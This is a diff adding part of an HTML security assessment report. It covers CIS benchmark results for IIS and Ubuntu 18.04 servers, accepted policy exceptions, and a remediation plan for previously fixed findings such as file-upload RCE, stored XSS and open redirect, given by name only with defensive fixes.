+    <tr style="background:#e8f5e9;"><td style="padding:6px 10px;font-family:monospace;">1.1</td><td style="padding:6px 10px;">Dedicated application pool per site</td><td style="padding:6px 10px;color:#2e7d32;font-weight:700;">PASSED</td><td style="padding:6px 10px;">—</td></tr>
+    <tr style="background:#e8f5e9;"><td style="padding:6px 10px;font-family:monospace;">1.3</td><td style="padding:6px 10px;">HTTPS bindings configured</td><td style="padding:6px 10px;color:#2e7d32;font-weight:700;">PASSED</td><td style="padding:6px 10px;">—</td></tr>
+    <tr style="background:#e8f5e9;"><td style="padding:6px 10px;font-family:monospace;">5.1</td><td style="padding:6px 10px;">Directory browsing disabled</td><td style="padding:6px 10px;color:#2e7d32;font-weight:700;">PASSED</td><td style="padding:6px 10px;">—</td></tr>
+  </table>
+  <div style="font-size:11px;color:#666;margin-top:8px;font-style:italic;">
+    Data source: Nessus compliance scan export — CIS Microsoft IIS 10 Benchmark v1.2.1 · Target: 217.218.33.98</div>
+</div><h2 class="subsection">4.2 Warning Controls (Review Required)</h2>
+<table class="std">
+  <tr><th>Control</th><th>Finding</th><th>Recommended Action</th></tr>
+  <tr><td>Session Timeout</td><td><span class="badge badge-warning">WARNING</span> Session timeout not configured or too permissive</td><td>Set <code>sessionState timeout="20"</code> in web.config</td></tr>
+  <tr><td>Error Handling</td><td><span class="badge badge-warning">WARNING</span> Custom errors not configured — verbose error messages may leak stack traces</td><td>Set <code>&lt;customErrors mode="On"&gt;</code> with generic error pages</td></tr>
+  <tr><td>Request Filtering</td><td><span class="badge badge-warning">WARNING</span> Request filtering rules not enforced</td><td>Enable IIS Request Filtering module; configure max URL length and query string limits</td></tr>
+  <tr><td>Directory Browsing</td><td><span class="badge badge-warning">WARNING</span> Review directory listing on non-production paths</td><td>Verify directory browsing is disabled on all sites</td></tr>
+  <tr><td>Application Pool Isolation</td><td><span class="badge badge-warning">WARNING</span> Multiple applications sharing application pools</td><td>Assign dedicated application pools to each web application</td></tr>
+  <tr><td>Logging</td><td><span class="badge badge-warning">WARNING</span> IIS logging not capturing all required fields</td><td>Enable W3C extended logging with cs-Referer, cs-User-Agent, sc-bytes, cs-bytes fields</td></tr>
+  <tr><td>Anonymous Authentication</td><td><span class="badge badge-warning">WARNING</span> Anonymous access not reviewed on all endpoints</td><td>Audit all paths for anonymous accessibility; restrict non-public endpoints</td></tr>
+  <tr><td>Backup Files</td><td><span class="badge badge-warning">WARNING</span> Potential web.config backups accessible</td><td>Remove or restrict access to .bak, .backup, .config.bak files</td></tr>
+  <tr><td>FTP Security</td><td><span class="badge badge-warning">WARNING</span> FTP configured without SSL enforcement on FTPBETADEMO</td><td>Enable FTP over SSL (FTPS) or disable FTP entirely if not required</td></tr>
+</table>
+
+<!-- 5. Ubuntu Hardening -->
+<h1 class="section" id="ubuntu">5. CIS Hardening Audit — Ubuntu 18.04 (5.0.0.106)</h1>
+
+<div class="info-box">
+  Assessment standard: CIS Ubuntu Linux 18.04 LTS Benchmark. Results: <strong>1 FAILED · 6 WARNING · 45 Corp-Policy · 190 PASSED</strong>. This server had an excellent compliance baseline — only one hard failure requiring remediation.
+</div>
+
+<h2 class="subsection">5.1 Failed Controls</h2>
+<div class="cis-section">
+  <div class="cis-item">
+    <span class="cis-id">4.4</span>
+    <span class="cis-text">
+      <span class="badge badge-failed">FAILED</span> <strong>Ensure logrotate assigns appropriate permissions (Automated).</strong><br>
+      Log files in <code>/var/log/</code> are assigned overly permissive modes by logrotate (other-readable). This allows any local user to read potentially sensitive log data including authentication events, error messages, and application output.
+      <br><br><em>Fix:</em> Edit <code>/etc/logrotate.conf</code> and set:
+      <div style="margin-top:6px; font-family:monospace; font-size:12px; background:#f0f0f0; padding:8px; border-radius:4px;">create 0640 root utmp</div>
+    </span>
+  </div>
+</div>
+
+<h2 class="subsection">5.2 Warning Controls</h2>
+<table class="std">
+  <tr><th>Control</th><th>Description</th><th>Recommended Action</th></tr>
+  <tr><td>4.3</td><td><span class="badge badge-warning">WARNING</span> Logrotate is not configured (manual review)</td><td>Review logrotate configuration for all application-level logs; ensure rotation frequency and retention align with policy</td></tr>
+  <tr><td>6.2.7</td><td><span class="badge badge-warning">WARNING</span> Users' dot files may be group or world writable</td><td>Run the provided CIS audit script to identify and restrict permissions on all <code>~user/.*</code> files to 640 or more restrictive</td></tr>
+  <tr><td>SSH Banner</td><td><span class="badge badge-warning">WARNING</span> SSH pre-login banner not configured</td><td>Set <code>Banner /etc/issue.net</code> in <code>/etc/ssh/sshd_config</code> with a legal notice</td></tr>
+  <tr><td>Unused Packages</td><td><span class="badge badge-warning">WARNING</span> Review for unnecessary packages that expand the attack surface</td><td>Audit installed packages; remove any not required for application function</td></tr>
+  <tr><td>NTP Config</td><td><span class="badge badge-warning">WARNING</span> NTP not verified as operational</td><td>Ensure chrony or systemd-timesyncd is configured and syncing; accurate time is required for log correlation and certificate validation</td></tr>
+  <tr><td>Audit Rules</td><td><span class="badge badge-warning">WARNING</span> auditd rules not comprehensive</td><td>Add audit rules for: privilege escalation, sudo usage, file permission changes in /etc, and user/group modification events</td></tr>
+</table>
+
+<h2 class="subsection">5.3 Corp-Policy Exceptions (Accepted Risk)</h2>
+<p>45 CIS recommendations were accepted as corporate policy exceptions with documented rationale:</p>
+<table class="std">
+  <tr><th>Category</th><th>Items</th><th>Rationale for Exception</th></tr>
+  <tr><td>Filesystem partitioning (1.1.x)</td><td>18 items</td><td>Server was provisioned before policy adoption; re-partitioning would require full rebuild. Scheduled for next OS refresh.</td></tr>
+  <tr><td>World-writable files (6.1.10)</td><td>1 item</td><td>Specific application files require world-write for deployment process; compensating control (deploy user isolation) documented.</td></tr>
+  <tr><td>Firewall rules (3.5.x)</td><td>12 items</td><td>Network-level firewall provides equivalent protection; host-based iptables deemed redundant for this environment.</td></tr>
+  <tr><td>Service hardening (2.x)</td><td>14 items</td><td>Services required for application function; hardening applied where possible without breaking functionality.</td></tr>
+</table>
+
+<!-- 6. Remediation Plan -->
+<h1 class="section" id="remediation">6. Consolidated Remediation Plan</h1>
+
+<h2 class="subsection">Priority 1 — Critical (Pre-Launch Blockers) — ALL RESOLVED ✅</h2>
+<table class="std">
+  <tr><th>Finding</th><th>Action</th><th>Status</th></tr>
+  <tr><td>FLY-001: RCE via File Upload</td><td>Server-side magic byte validation; sandbox CDN domain; Content-Disposition enforcement</td><td><span class="badge badge-passed">✅ Fixed Pre-Launch</span></td></tr>
+  <tr><td>FLY-002: Stored XSS</td><td>File type restriction; CSP implementation</td><td><span class="badge badge-passed">✅ Fixed Pre-Launch</span></td></tr>
+  <tr><td>FLY-003: Open Redirect</td><td>Redirect URL whitelist; sandboxed CDN</td><td><span class="badge badge-passed">✅ Fixed Pre-Launch</span></td></tr>
+</table>
+
+<h2 class="subsection">Priority 2 — IIS Hardening (High-Impact Items)</h2>
+<table class="std">
+  <tr><th>#</th><th>Action</th><th>CIS Reference</th></tr>
+  <tr><td>1</td><td>Disable WebDAV module</td><td>1.7</td></tr>
+  <tr><td>2</td><td>Add Host headers to all IIS site bindings</td><td>1.2</td></tr>
+  <tr><td>3</td><td>Configure global deny-by-default authorization rule</td><td>2.1</td></tr>
+  <tr><td>4</td><td>Enforce Forms Authentication with SSL + cookie protection</td><td>2.3, 2.4, 2.5</td></tr>
+  <tr><td>5</td><td>Add all security response headers (CSP, HSTS, X-Frame-Options, etc.)</td><td>7.x</td></tr>
+  <tr><td>6</td><td>Disable TLS 1.0/1.1; enforce TLS 1.2/1.3 only via Schannel</td><td>3.x</td></tr>
+</table>
+
+<h2 class="subsection">Priority 3 — Ubuntu Hardening</h2>
+<table class="std">
+  <tr><th>#</th><th>Action</th><th>CIS Reference</th></tr>
+  <tr><td>1</td><td>Fix logrotate permissions: <code>create 0640</code></td><td>4.4</td></tr>
+  <tr><td>2</td><td>Audit and restrict user dot-file permissions</td><td>6.2.7</td></tr>
+  <tr><td>3</td><td>Configure auditd with comprehensive rule set</td><td>4.1.x</td></tr>
+  <tr><td>4</td><td>Configure SSH legal banner</td><td>5.2.15</td></tr>
+  <tr><td>5</td><td>Verify NTP synchronisation</td><td>2.2.1.x</td></tr>
+</table>
+
+<h2 class="subsection">CIS Benchmark Post-Hardening Applied</h2>
+<p>Following the assessment, the following CIS hardening measures were applied to the IIS server and verified by re-scan:</p>
+<table class="std">
+  <tr><th>Area</th><th>Controls Applied</th></tr>
+  <tr><td>IIS Configuration</td><td>CIS Benchmarks applied to IIS 10; directory browsing disabled; request filtering enabled; server tokens removed</td></tr>
+  <tr><td>Windows Server</td><td>Applied CIS Windows Server hardening: disabled unnecessary services (NetBIOS, LLMNR, WinRM if unused), restricted SMB access, enabled Windows Firewall</td></tr>
+  <tr><td>MSSQL</td><td>Applied CIS MSSQL Benchmark: disabled xp_cmdshell; restricted sa account; enabled SQL Server Audit; removed default databases</td></tr>
+  <tr><td>Network</td><td>Configured network-level firewall rules matching internal access matrix; unnecessary ports closed</td></tr>
+</table>
+
+</div>
+
+<footer>
+  <p><strong>Alireza Kamani</strong> · Penetration Tester &amp; Security Engineer · CIS Hardening Specialist</p>
+  <p style="margin-top:8px"><a href="https://linkedin.com/in/alireza-kamani" style="color:#90caf9">linkedin.com/in/alireza-kamani</a> · <a href="https://github.com/alireza-kamani" style="color:#90caf9">github.com/alireza-kamani</a></p>
+  <p style="margin-top:8px">All findings were remediated before public launch. Published for portfolio purposes with client permission after NDA expiry.</p>
+</footer>
+</body>
+</html>
